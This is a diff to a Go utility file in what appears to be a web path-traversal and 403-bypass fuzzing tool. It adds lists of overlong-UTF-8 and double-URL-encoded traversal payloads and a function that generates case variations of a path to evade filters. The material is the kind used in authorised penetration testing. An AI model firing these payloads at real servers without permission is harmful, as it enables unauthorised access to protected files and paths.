@@ -1,5 +1,9 @@
 package utils
 
+import (
+	"strings"
+)
+
 var UserAgents = []string{
 	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
 	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
@@ -163,4 +167,65 @@ var TopSuffixes = []string{
 	"..;/", "../", "..://", "//..://",
 	"\\.\\..", "\\?\\",
 	".html", ".htm",
+}
+
+// Unicode bypass payloads for path traversal
+var UnicodePrefixes = []string{
+	"/%c0%af/",
+	"/%c0%ae/",
+	"/%c0%ae%c0%ae/",
+	"/%ef%bc%8f/",
+	"/%e2%80%8c/",
+	"/%e2%80%8d/",
+	"/%c1%9c/",
+	"/%c0%2f/",
+	"/%e0%80%af/",
+	"/%f0%80%80%af/",
+	"/%c0%2e/",
+	"/%c0%2e%c0%2e/",
+	"/%e0%40%ae/",
+	"/%c0%5c/",
+	"/%c0%ae%c0%5c/",
+}
+
+// Double URL encoding payloads
+var DoubleEncodedPrefixes = []string{
+	"/%252e/",
+	"/%252e%252e/",
+	"/%252f/",
+	"/%252e%252e%252f/",
+	"/%25252e/",
+	"/%25252e%25252e/",
+	"/%255c/",
+	"/%252e%255c%252e%252e/",
+	"/%2525%32%65/",
+	"/%252e%252e%255c/",
+}
+
+// GenerateCaseVariations generates case variations of a path
+func GenerateCaseVariations(path string) []string {
+	if path == "" || path == "/" {
+		return []string{path}
+	}
+
+	variations := []string{}
+	variations = append(variations, path)
+	variations = append(variations, strings.ToUpper(path))
+	variations = append(variations, strings.ToLower(path))
+
+	if len(path) > 1 {
+		variations = append(variations, strings.ToUpper(string(path[0]))+path[1:])
+	}
+
+	alt := ""
+	for i, c := range path {
+		if i%2 == 0 {
+			alt += strings.ToUpper(string(c))
+		} else {
+			alt += strings.ToLower(string(c))
+		}
+	}
+	variations = append(variations, alt)
+
+	return variations
 }
